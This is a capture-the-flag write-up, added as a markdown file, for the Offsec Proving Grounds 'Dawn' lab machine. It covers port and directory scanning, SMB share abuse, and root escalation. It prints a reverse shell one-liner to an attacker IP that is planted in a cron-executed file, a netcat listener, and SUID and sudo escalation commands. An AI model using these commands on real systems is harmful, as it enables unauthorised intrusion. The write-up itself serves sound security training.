@@ -1,0 +1,70 @@
+---
+tags: smb
+---
+### Offsec PG: Dawn Writeup
+#### Scanning and Enumeration 
+- I inspect the webpage for some relevant information  and find none, just the drfault page.
+![](Dawn_assets/Pasted%20image%2020220924194756.png)
+- So firstly start by start by doing an nmap scan withthe syntax `nmap -sV -sC -T4 192.168.155.11`
+```
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-24 00:57 WAT
+Warning: 192.168.155.11 giving up on port because retransmission cap hit (6).
+Nmap scan report for 192.168.155.11
+Host is up (0.13s latency).
+Not shown: 991 closed tcp ports (conn-refused)
+PORT     STATE    SERVICE       VERSION
+80/tcp   open     http          Apache httpd 2.4.38 ((Debian))
+|_http-title: Site doesn't have a title (text/html).
+|_http-server-header: Apache/2.4.38 (Debian)
+139/tcp  open     netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open     netbios-ssn   Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
+1322/tcp filtered novation
+1999/tcp filtered tcp-id-port
+3071/tcp filtered csd-mgmt-port
+3306/tcp open     mysql         MySQL 5.5.5-10.3.15-MariaDB-1
+**SNIP**
+5801/tcp filtered vnc-http-1
+5910/tcp filtered cm
+Service Info: Host: DAWN
+```
+- and i get some useful service versions to take note of like:
+	-  Samba smbd 4.9.5-Debian
+	- MySQL 5.5.5-10.3.15-MariaDB-1
+	- Apache httpd 2.4.38 ((Debian))
+- after running a directory scan using FFUF `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://192.168.155.11/FUZZ`, I discovered 2 directories
+![](Dawn_assets/Pasted%20image%2020220924041240.png)
+- looking at the NMAP scan, we will see that SMB is running, so will list the shares using smbclient `smbclient -L \\\\192.168.155.11\\` 
+![](Dawn_assets/Pasted%20image%2020220926061222.png)
+- or we can use nmap `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.155.11` to do so and even check the permissions of each share as seen below
+![](Dawn_assets/Pasted%20image%2020220924042746.png)
+from the above diagram we will notice that both the $IPC and ITDEPT shares have read/write permissions
+- I then access the $IPC share but get the error `NT_STATUS_OBJECT_NAME_NOT_FOUND listing \* smbclient` when trying to view files in the share
+- when I access the ITDEPT share, i discover that the share is empty.
+![](Dawn_assets/Pasted%20image%2020220926070432.png)
+- then going to the logs directory and we will see some log files
+![](Dawn_assets/Pasted%20image%2020220924192240.png)
+-  i am only able to access the management.log directory and we will see the running processes that have been logged. from there we will notice interesting command running as cronjobs 
+![](Dawn_assets/Pasted%20image%2020220924042034.png)
+- looking at the image above, we can see that the permissions of a file product-control is being changed and the file is being executed as well
+#### Exploitation and Foothold
+- so having this knowledge, i then create a file product-control on my attack machine which contains a reverse shell one liner `sh -i >& /dev/tcp/192.168.49.155/9001 0>&1`  and then save the file
+- then i uploaded the file to the smb share using `put product-control` and set up a listener with netcat `nc -nvlp 9001`
+![](Dawn_assets/Pasted%20image%2020220926070054.png)
+- after waiting for a while, i then get a shell
+![](Dawn_assets/Pasted%20image%2020220926065652.png)
+- then we find the first flag in the home directory in a file local.txt
+#### Privilege Escalation
+- After gaining foothold and the first flag, we want to escalate out privileges, so we run  `sudo -l` to see if we have any escalation vectors and see that mysql can be run with sudo privileges without password
+- we then run check the .bash_history file to see if we can can get some information but we get nothing
+- so checking for the mysql binary on GTFObins, we wills ee that we can elevate privileges with mysql by running the command `sudo mysql -e '\! /bin/sh'` 
+![](Dawn_assets/Pasted%20image%2020220924191058.png)
+but after running it we discover that we need a password for the root user.
+- after looking through, we don't get any information about the password
+- so we will upload our linpeas.sh script to check for more escalation vectors and we discover the `/zsh` binary is running with SUID Permissions
+![](Dawn_assets/Pasted%20image%2020220926065006.png)
+and we can verify as seen below
+![](Dawn_assets/Pasted%20image%2020220926065934.png)
+-  so we can run`/usr/bin/zsh` and we can see we have root access 
+![](Dawn_assets/Pasted%20image%2020220926065257.png)
+- so going to the root directory, we discover our root password in the proof.txt file 
+![](Dawn_assets/Pasted%20image%2020220926065400.png)
